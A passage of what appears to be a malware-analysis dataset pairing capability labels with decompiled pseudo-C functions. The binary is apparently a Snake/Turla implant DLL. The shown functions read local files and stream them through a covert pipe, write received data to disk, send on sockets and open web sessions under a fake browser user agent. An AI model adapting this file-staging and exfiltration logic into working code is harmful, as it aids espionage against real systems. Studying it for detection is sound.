        "decompiled_code": "\nuint32_t __cdecl fcn.2000330f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_48h;\n    uint auStack60 [12];\n    uint var_8h;\n    \n    uVar1 = arg_18h;\n    if (arg_18h < 4) {\n        uVar3 = fcn.20002de0(&arg_18h, 5);\n        uVar2 = arg_18h;\n        if (uVar3 == 0) {\n            fcn.20002847();\n            fcn.20002744(arg_ch, arg_10h, arg_14h);\n            iVar4 = fcn.20002965();\n            if (iVar4 == -1) {\n                uVar3 = 5;\n            }\n            else {\n                iVar5 = (**(*(uVar2 + 0x44) + 0x14))(*(uVar2 + 0x48), &var_48h, 0x40, iVar4);\n                if (iVar5 == 0) {\n                    auStack60[uVar1] = arg_1ch;\n                    iVar4 = (**(*(uVar2 + 0x44) + 0x18))(*(uVar2 + 0x48), &var_48h, 0x40, iVar4);\n                    uVar3 = -(iVar4 != 0) & 3;\n                }\n                else {\n                    uVar3 = 3;\n                }\n            }\n            fcn.20002815();\n        }\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 417
    },
    "20003511": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20003511(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_20h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    iVar1 = fcn.20002de0(&var_4h, 1);\n    iVar3 = var_4h;\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.20002847();\n    var_4h = fcn.20002744(arg_ch, arg_10h);\n    if (var_4h == 0) {\n        iVar3 = 5;\n    }\n    else {\n        iVar1 = fcn.20002965(arg_14h);\n        if (iVar1 == -1) {\n            iVar3 = 5;\n        }\n        else {\n            iVar2 = (**(*(iVar3 + 0x44) + 0x14))(*(iVar3 + 0x48), &var_4ch, 0x40, iVar1);\n            if (iVar2 == 0) {\n                var_44h = arg_18h;\n                fcn.20002744(arg_ch, arg_18h);\n                var_48h = fcn.200027d7();\n                var_48h = var_48h + 1;\n                *arg_1ch = var_48h;\n                iVar3 = (**(*(iVar3 + 0x44) + 0x18))(*(iVar3 + 0x48), &var_4ch, 0x40, iVar1);\n                if (iVar3 == 0) {\n                    fcn.20002c3e(var_4h, arg_14h);\n                    fcn.200028a0(arg_ch, arg_18h, var_48h, var_40h, iVar1, var_20h);\n                    iVar3 = 0;\n                    goto code_r0x200035ee;\n                }\n            }\n            iVar3 = 3;\n        }\n    }\ncode_r0x200035ee:\n    fcn.20002815();\n    return iVar3;\n}\n",
        "token_count": 537
    },
    "20003efc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.20003efc(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    if (*0x20034158 != -1) {\n        uVar1 = fcn.20003bbd(*0x20034158, param_1, param_2);\n        return uVar1;\n    }\n    return 1;\n}\n",
        "token_count": 81
    },
    "20004581": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.20004581(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (*0x20034158 != -1) {\n        return -1;\n    }\n    iVar1 = fcn.20004566(param_1, param_2, 0x20034158);\n    if (iVar1 != 0) {\n        *0x20034158 = 0xffffffff;\n        return iVar1;\n    }\n    iVar1 = *(*0x20034158 * 4 + 0x2004735c);\n    *0x20046c1c = iVar1 + 8;\n    *0x20046c20 = *(iVar1 + 0x34);\n    return 0;\n}\n",
        "token_count": 165
    },
    "20006aef": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20006aef(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *unaff_EBX;\n    int32_t *unaff_EDI;\n    uint var_14h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    iVar1 = fcn.20007ba8(&var_14h, 0x10, 0x228);\n    if (iVar1 != 0) {\n        return 0x215901f9;\n    }\n    var_4h = fcn.2000d46b(&var_14h, 0x10, *unaff_EBX, *unaff_EDI);\n    if (var_4h == -1) {\n        return 0x215901fa;\n    }\n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(var_4h);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        fcn.2000d490(&var_14h, 0x10, iVar1, *unaff_EBX, *unaff_EDI);\n        *unaff_EBX = iVar1;\n        *unaff_EDI = var_4h;\n        *arg_8h = iVar1;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 319
    },
    "2000a2a6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000a2a6(uint filename, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t arg_10h;\n    uint var_30h;\n    int32_t size;\n    \n    arg_10h = 0;\n    *_sym.imp.msvcrt.dll__fmode = 0x8000;\n    iVar1 = (*_sym.imp.msvcrt.dll_fopen)(filename, 0x2002d518);\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.msvcrt.dll__fileno)(iVar1, &var_30h);\n        iVar4 = sub.msvcrt.dll__fstat(uVar3);\n        if (iVar4 != -1) {\n            arg_10h = (*_sym.imp.msvcrt.dll_malloc)(size);\n            if (arg_10h == 0) {\n                uVar5 = 0x21590004;\n                goto code_r0x2000a346;\n            }\n            iVar4 = (*_sym.imp.msvcrt.dll_fread)(arg_10h, 1, size, iVar1);\n            if (iVar4 == size) {\n                iVar4 = sym.inj_snake_Win32.dll_local_queue_write(3, arg_ch, arg_10h, size, 0, 1);\n                if (iVar4 == 0) {\n                    uVar5 = 0;\n                }\n                else {\n                    uVar5 = iVar4 + 0x191U | 0x21590000;\n                }\n                goto code_r0x2000a346;\n            }\n        }\n    }\n    puVar2 = (*_sym.imp.msvcrt.dll__errno)();\n    uVar5 = *puVar2;\ncode_r0x2000a346:\n    (*_sym.imp.msvcrt.dll_free)(arg_10h);\n    if (iVar1 != 0) {\n        (*_sym.imp.msvcrt.dll_fclose)(iVar1);\n    }\n    return uVar5;\n}\n",
        "token_count": 472
    },
    "2000b661": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.2000b661(uint arg_8h, uint noname_1, uint arg_10h, uint *arg_14h, int32_t *arg_18h, uint32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint arg_ch;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint var_54h;\n    uint32_t var_40h;\n    int16_t *var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int16_t *var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = -1;\n    *arg_14h = 1;\n    var_ch = 0;\n    var_8h = 0;\n    var_4h = 0;\n    var_20h = 0;\n    iVar2 = fcn.2000d580(arg_10h, 3, 4, &var_14h, 0);\n    if (iVar2 == 0) {\n        return 0x21590065;\n    }\n    var_1ch = 0xffffffff;\n    var_18h = 0;\n    arg_14h = arg_14h & 0xffffff;\n    fcn.2000d5bb(arg_10h, 7, 2, &var_18h, 4);\n    fcn.2000d5bb(arg_10h, 8, 2, &var_1ch, 4);\n    fcn.2000d5bb(arg_10h, 0x15, 1, &arg_14h + 3, 1);\n    if ((*var_14h == 0x26) && (arg_14h._3_1_ == '\\0')) {\n        var_14h = var_14h + 1;\n        arg_14h = CONCAT13(1, arg_14h._0_3_);\n    }\n    if (arg_20h != 0) {\n        var_ch = 0x2000;\n        var_8h = 0x6000;\n        fcn.2000d5bb(arg_10h, 10, 2, &var_ch, 4);\n        fcn.2000d5bb(arg_10h, 0xb, 2, &var_8h, 4);\n        if ((var_8h == 0) || (var_8h < var_ch)) {\n            uVar5 = 0x21590064;\n            goto code_r0x2000b94a;\n        }\n    }\n    if (arg_14h._3_1_ == '\\0') {\n        iVar2 = (*_sym.imp.msvcrt.dll__wopen)(var_14h, 0);\n        arg_ch = 0xffffffff;\n        var_10h = iVar2;\n        if (iVar2 == -1) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            return uVar5;\n        }\n        if ((var_18h != 0) && (iVar3 = (*_sym.imp.msvcrt.dll__lseek)(iVar2, var_18h, 0),  iVar3 != var_18h)) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x2000b94a;\n        }\n        sub.msvcrt.dll__fstat(iVar2, &var_54h);\n        var_4h = var_40h;\n    }\n    else {\n        if (arg_20h != 0) {\n            return 0x21590001;\n        }\n        arg_ch = (*_sym.imp.ntdll.dll_wcstoul)(var_14h, &var_24h, 0);\n        if (*var_24h != 0) {\n            return 0x21590065;\n        }\n        iVar2 = sym.inj_snake_Win32.dll_local_queue_read(3, arg_ch, 0, 0, &var_4h, 0);\n        if (iVar2 != 0) {\n            return iVar2 + 0x191U | 0x21590000;\n        }\n        var_10h = -1;\n    }\n    if (var_1ch < var_4h) {\n        var_4h = var_1ch;\n    }\n    if (arg_20h == 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(var_4h);\n        piVar1 = arg_18h;\n        *arg_18h = iVar2;\n        if (iVar2 != 0) {\n            if (var_10h == -1) {\n                iVar2 = sym.inj_snake_Win32.dll_local_queue_read(3, arg_ch, iVar2, var_4h, &var_4h, 0);\n                if (iVar2 != 0) {\n                    (*_sym.imp.msvcrt.dll_free)(*piVar1);\n                    *piVar1 = 0;\n                    uVar5 = iVar2 + 0x191U | 0x21590000;\n                    goto code_r0x2000b94a;\n                }\n            }\n            else {\n                var_4h = (*_sym.imp.msvcrt.dll__read)(var_10h, iVar2, var_4h);\n                if (var_4h < 0) {\n                    (*_sym.imp.msvcrt.dll_free)(*piVar1);\n                    *piVar1 = 0;\ncode_r0x2000b855:\n                    puVar4 = (*_sym.imp.msvcrt.dll__errno)();\n                    uVar5 = *puVar4;\n                    goto code_r0x2000b94a;\n                }\n            }\n            *arg_1ch = var_4h;\ncode_r0x2000b948:\n            uVar5 = 0;\n            goto code_r0x2000b94a;\n        }\n    }\n    else {\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(var_8h);\n        var_20h = iVar2;\n        if (iVar2 != 0) {\n            var_4h = (*_sym.imp.WS2_32.dll_htonl)(var_4h);\n            do {\n                uVar5 = sym.inj_snake_Win32.dll_tr_write_pipe(arg_8h);\n                if (uVar5 != 0) goto code_r0x2000b94a;\n                if (var_ch < var_8h) {\n                    uVar5 = fcn.200018bf();\n                    var_4h = uVar5 % ((var_8h - var_ch) + 1) + var_ch;\n                }\n                else {\n                    uVar5 = fcn.200018bf();\n                    var_4h = uVar5 % ((var_ch - var_8h) + 1) + var_8h;\n                }\n                var_4h = (*_sym.imp.msvcrt.dll__read)(var_10h, iVar2, var_4h);\n                if (var_4h < 0) goto code_r0x2000b855;\n            } while (var_4h != 0);\n            uVar5 = sym.inj_snake_Win32.dll_tr_write_pipe(arg_8h);\n            if (uVar5 != 0) goto code_r0x2000b94a;\n            goto code_r0x2000b948;\n        }\n    }\n    uVar5 = 0x21590004;\ncode_r0x2000b94a:\n    (*_sym.imp.msvcrt.dll_free)(var_20h);\n    if (var_10h != -1) {\n        (*_sym.imp.msvcrt.dll__close)(var_10h);\n    }\n    return uVar5;\n}\n",
        "token_count": 1789
    },
    "2000b96b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.2000b96b(uint arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint noname_4, uint noname_5, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint var_20h;\n    int16_t *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int16_t *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.2000d580(arg_10h, 3, 4, &var_10h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    var_1h._0_1_ = '\\0';\n    fcn.2000d5bb(arg_10h, 0x15, 1, &var_1h, 1);\n    if (*var_10h == 0x26) {\n        if (var_1h == '\\0') {\n            var_10h = var_10h + 1;\n            var_1h._0_1_ = '\\x01';\n            goto code_r0x2000b9c6;\n        }\ncode_r0x2000b9cb:\n        if (arg_20h != 0) {\n            return 0x21590001;\n        }\n        arg_ch = (*_sym.imp.ntdll.dll_wcstoul)(var_10h, &var_1ch, 0);\n        if (*var_1ch != 0) {\n            return 0x21590065;\n        }\n        var_ch = -1;\n    }\n    else {\ncode_r0x2000b9c6:\n        if (var_1h != '\\0') goto code_r0x2000b9cb;\n        var_ch = (*_sym.imp.msvcrt.dll__wopen)(var_10h, 0x301, 0x180);\n        arg_ch = 0xffffffff;\n        if (var_ch == -1) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            return uVar3;\n        }\n        if (arg_20h != 0) {\n            sym.inj_snake_Win32.dll_config_read_uint32(400, 20000);\n            uVar3 = sym.inj_snake_Win32.dll_tr_read_pipe(arg_8h);\n            while (uVar3 == 0) {\n                if (var_14h == 0) goto code_r0x2000bb1a;\n                iVar1 = (*_sym.imp.msvcrt.dll__write)(var_ch, var_8h, var_14h);\n                if (iVar1 < 0) {\n                    puVar2 = (*_sym.imp.msvcrt.dll__errno)();\n                    uVar3 = *puVar2;\n                    sym.inj_snake_Win32.dll_tr_free(arg_8h, var_8h, 0);\n                    break;\n                }\n                sym.inj_snake_Win32.dll_tr_free(arg_8h, var_8h, 0);\n                uVar3 = sym.inj_snake_Win32.dll_tr_read_pipe(arg_8h);\n            }\n            goto code_r0x2000bb33;\n        }\n    }\n    iVar1 = fcn.2000d580(arg_10h, 4, 5, &var_8h, &var_18h);\n    if (iVar1 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else {\n        if (var_ch == -1) {\n            iVar1 = sym.inj_snake_Win32.dll_local_queue_write(3, arg_ch, var_8h, var_18h, 0, 1);\n            if (iVar1 != 0) {\n                return iVar1 + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            iVar1 = (*_sym.imp.msvcrt.dll__write)(var_ch, var_8h, var_18h);\n            if (iVar1 < 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                goto code_r0x2000bb33;\n            }\n        }\ncode_r0x2000bb1a:\n        uVar3 = 0;\n    }\ncode_r0x2000bb33:\n    if (var_ch != -1) {\n        (*_sym.imp.msvcrt.dll__close)(var_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 1071
    },
    "2000df70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000df70(int32_t arg_8h, int32_t s, int32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    \n    if (arg_8h == 0) {\n        uVar1 = 0x21590065;\n    }\n    else if (s == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        uVar1 = 0x21590067;\n    }\n    else {\n        arg_ch = (*_sym.imp.msvcrt.dll_malloc)(0x20a);\n        if (arg_ch == 0) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            iVar2 = (*_sym.imp.ntdll.dll_mbstowcs)(arg_ch, s, 0x104);\n            if (iVar2 == -1) {\n                uVar1 = 0x21590066;\n            }\n            else {\n                *(arg_ch + iVar2 * 2) = 0;\n                uVar1 = fcn.20010a37(arg_8h, arg_ch, arg_10h);\n            }\n            (*_sym.imp.msvcrt.dll_free)(arg_ch);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 300
    },
    "2000e509": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000e509(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_4h;\n    \n    if (arg_8h != '\\0') {\n        iVar1 = sub.ntdll.dll_ZwQueryInformationProcess();\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        *arg_ch = var_18h;\n        return (-(var_18h != 0) & 0xdea6fffb) + 0x21590005;\n    }\n    arg_8h = 0;\n    var_4h = 0;\n    if (unaff_EDI == -1) {\n        arg_8h = -2;\n    }\n    else {\n        iVar1 = fcn.2000d78b(unaff_EDI, 0x48, &arg_8h);\n        if (iVar1 != 0) goto code_r0x2000e5d9;\n    }\n    iVar1 = (*_sym.imp.ntdll.dll_ZwQueryInformationThread)(arg_8h, 0, &var_20h, 0x1c, 0);\n    if (iVar1 == 0) {\n        if ((var_1ch == 0) || (var_1ch == -0x2030)) {\n            iVar1 = 0x21590005;\n        }\n        else {\n            iVar1 = fcn.2000d8f1();\n            if (iVar1 == 0) {\n                *arg_ch = var_4h;\n                iVar1 = (-(var_4h != 0) & 0xdea6fffb) + 0x21590005;\n            }\n        }\n    }\ncode_r0x2000e5d9:\n    if (arg_8h != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 469
    },
    "200105cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200105cc(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.ntdll.dll_mbstowcs;\n    pcVar1 = _sym.imp.msvcrt.dll_malloc;\n    var_4h = 0;\n    var_8h = 0;\n    if (arg_8h == 0) {\n        return 0x21590065;\n    }\n    if (arg_ch == 0) {\n        return 0x21590066;\n    }\n    if (arg_10h == 0) {\ncode_r0x20010640:\n        if (arg_14h != 0) {\n            var_8h = (*pcVar1)(0x20a);\n            if (var_8h == 0) goto code_r0x20010619;\n            iVar3 = (*pcVar2)(var_8h, arg_14h, 0x104);\n            if (iVar3 == -1) goto code_r0x2001062f;\n            *(var_8h + iVar3 * 2) = 0;\n        }\n        uVar4 = fcn.20010268(arg_8h, arg_ch, var_4h, var_8h, arg_18h);\n    }\n    else {\n        var_4h = (*_sym.imp.msvcrt.dll_malloc)(0x20a);\n        if (var_4h != 0) {\n            iVar3 = (*pcVar2)(var_4h, arg_10h, 0x104);\n            if (iVar3 != -1) {\n                *(var_4h + iVar3 * 2) = 0;\n                goto code_r0x20010640;\n            }\ncode_r0x2001062f:\n            uVar4 = 0x21590066;\n            goto code_r0x20010683;\n        }\ncode_r0x20010619:\n        uVar4 = 0x21590004;\n    }\ncode_r0x20010683:\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(var_8h);\n    (*pcVar1)(var_4h);\n    return uVar4;\n}\n",
        "token_count": 561
    },
    "200109d5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.200109d5(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_ch = (*_sym.imp.msvcrt.dll_malloc)(0x20a);\n    if (arg_ch == 0) {\n        return 0x21590004;\n    }\n    iVar1 = (*_sym.imp.ntdll.dll_mbstowcs)(arg_ch, param_2, 0x104);\n    if (iVar1 == -1) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        *(arg_ch + 0x104) = 0;\n        uVar2 = fcn.2001057d(param_1, arg_ch, param_3);\n    }\n    (*_sym.imp.msvcrt.dll_free)(arg_ch);\n    return uVar2;\n}\n",
        "token_count": 201
    },
    "20010a7f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20010a7f(uint arg_8h, int32_t arg_ch, uint s, uint arg_14h, int32_t *arg_18h)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t s1;\n    int32_t iVar3;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    puVar2 = (*_sym.imp.ntdll.dll_strrchr)(s, 0x2e);\n    if (puVar2 == NULL) {\n        return 0x2159000d;\n    }\n    *puVar2 = 0;\n    s1 = (*_sym.imp.msvcrt.dll_malloc)(0x20a);\n    pcVar1 = _sym.imp.ntdll.dll_mbstowcs;\n    if (s1 == 0) {\n        var_4h = 0x21590004;\n    }\n    else {\n        var_ch = 0;\n        iVar3 = (*_sym.imp.ntdll.dll_mbstowcs)(s1, s, 0x104);\n        while (iVar3 != -1) {\n            *(s1 + iVar3 * 2) = 0;\n            var_4h = fcn.2000dff5(arg_8h, s1, 0x20a, &var_ch);\n            if (var_4h != 0) goto code_r0x20010b6d;\n            var_4h = fcn.20010a37(arg_8h, s1, &var_8h);\n            if (var_4h != 0) goto code_r0x20010b6d;\n            if (var_8h != arg_ch) {\n                var_4h = fcn.20010e9b(arg_8h, var_8h, puVar2 + 1, arg_14h);\n                if (var_4h == 0) goto code_r0x20010b6d;\n            }\n            if (var_ch == -1) {\n                var_4h = 0x2159000d;\n                goto code_r0x20010b6d;\n            }\n            fcn.20011537(arg_8h, var_8h, 1);\n            iVar3 = (*pcVar1)(s1, s, 0x104);\n        }\n        var_4h = 0x21590066;\ncode_r0x20010b6d:\n        (*_sym.imp.msvcrt.dll_free)(s1);\n        if (var_4h == 0) {\n            *arg_18h = var_8h;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 617
    },
    "2001b448": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.2001b448(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t aiStack136 [32];\n    uchar auStack8 [4];\n    \n    uVar2 = 0;\n    if (in_EAX != NULL) {\n        do {\n            if (0xf < uVar2) break;\n            aiStack136[uVar2 * 2 + 1] = in_EAX[1];\n            aiStack136[uVar2 * 2] = in_EAX[2];\n            in_EAX = *in_EAX;\n            uVar2 = uVar2 + 1;\n        } while (in_EAX != NULL);\n        if (in_EAX != NULL) {\n            return 0x21590001;\n        }\n    }\n    iVar1 = (*_sym.imp.WS2_32.dll_WSASend)(*(param_1 + 4), aiStack136, uVar2, auStack8, 0, 0, 0);\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        if (iVar1 == 0x2738) {\n            iVar1 = 0x2159000b;\n        }\n    }\n    else {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 312
    },
    "2001b4b9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001b4b9(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_80h;\n    int32_t aiStack128 [31];\n    \n    uVar3 = 0;\n    piVar1 = arg_ch;\n    if (arg_ch != NULL) {\n        do {\n            if (0xf < uVar3) break;\n            aiStack128[uVar3 * 2] = piVar1[1];\n            aiStack128[uVar3 * 2 + -1] = piVar1[2];\n            piVar1 = *piVar1;\n            uVar3 = uVar3 + 1;\n        } while (piVar1 != NULL);\n        if (piVar1 != NULL) {\n            return 0x21590001;\n        }\n    }\n    iVar2 = (*_sym.imp.WS2_32.dll_WSASendTo)(*(arg_8h + 4), &var_80h, uVar3, &arg_ch, 0, arg_10h, 0x80, 0, 0);\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        if (iVar2 == 0x2738) {\n            return 0x2159000b;\n        }\n    }\n    else {\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 348
    },
    "2001e48e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2001e48e(int32_t *arg_8h, uint noname_1, uint noname_2, uint noname_3, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    \n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x7c);\n    if (iVar2 == 0) {\n        return 0x21590004;\n    }\n    sub.ntdll.dll_memset(iVar2, 0, 0x7c);\n    if ((arg_18h == 0) || (iVar3 = sub.ntdll.dll_strlen(arg_18h),  iVar3 + 1 != arg_1ch)) {\n        iVar3 = 0x215900cb;\n    }\n    else {\n        iVar3 = (*_sym.imp.WININET.dll_InternetOpenA)(\"Mozilla/4.0 (compatible; MSIE 6.0)\", 0, 0, 0, 0x10000000);\n        *(iVar2 + 0xc) = iVar3;\n        if ((iVar3 == 0) ||\n           (iVar3 = (*_sym.imp.WININET.dll_InternetSetStatusCallback)(iVar3, fcn.2001e446),  iVar3 == -1)) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            iVar3 = (*_sym.imp.msvcrt.dll__strdup)(arg_18h);\n            *(iVar2 + 4) = iVar3;\n            pcVar1 = _sym.imp.ntdll.dll_strchr;\n            if (iVar3 == 0) {\n                iVar3 = 0x21590004;\n                goto code_r0x2001e5b2;\n            }\n            iVar3 = (*_sym.imp.ntdll.dll_strchr)(iVar3, 0x5d);\n            if (iVar3 == 0) {\n                iVar3 = *(iVar2 + 4);\n            }\n            puVar4 = (*pcVar1)(iVar3, 0x3a);\n            if (puVar4 == NULL) {\n                *(iVar2 + 8) = 0x50;\n            }\n            else {\n                *puVar4 = 0;\n                iVar3 = (*_sym.imp.ntdll.dll_atoi)(puVar4 + 1);\n                *(iVar2 + 8) = iVar3;\n                if ((iVar3 < 1) || (0xffff < iVar3)) {\n                    iVar3 = 0x215900ca;\n                    goto code_r0x2001e5b2;\n                }\n            }\n            *(iVar2 + 0x1c) = 100;\n            *(iVar2 + 0x20) = 500;\n            *(iVar2 + 0x44) = 0x200;\n            iVar3 = fcn.200012fa(iVar2 + 0x34);\n            if (iVar3 != 0) {\n                *arg_8h = iVar2;\n                return 0;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n    }\n    if (iVar3 == 0) {\n        return 0;\n    }\ncode_r0x2001e5b2:\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(*(iVar2 + 4));\n    if (*(iVar2 + 0xc) != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(*(iVar2 + 0xc));\n    }\n    (*pcVar1)(iVar2);\n    return iVar3;\n}\n",
        "token_count": 820
    },
    "2001ea9e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.2001ea9e(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    \n    fcn.20001567(0x2004706c);\n    uVar2 = *0x2004708c;\n    uVar3 = *0x20047088;\n    iVar4 = *0x20047084;\n    fcn.2000157d(0x2004706c);\n    pcVar1 = _sym.imp.WININET.dll_InternetCloseHandle;\n    if (iVar4 == 0) {\ncode_r0x2001eadb:\n        uVar3 = 0xffffffff;\n    }\n    else {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(*(in_EAX + 0xc));\n        iVar4 = (*_sym.imp.WININET.dll_InternetOpenA)(uVar2, 3, uVar3, unaff_EBX, 0x10000000);\n        *(in_EAX + 0xc) = iVar4;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.WININET.dll_InternetSetStatusCallback)(iVar4, fcn.2001e446);\n            if (iVar4 == -1) {\n                (*pcVar1)(*(in_EAX + 0xc));\n                *(in_EAX + 0xc) = 0;\n            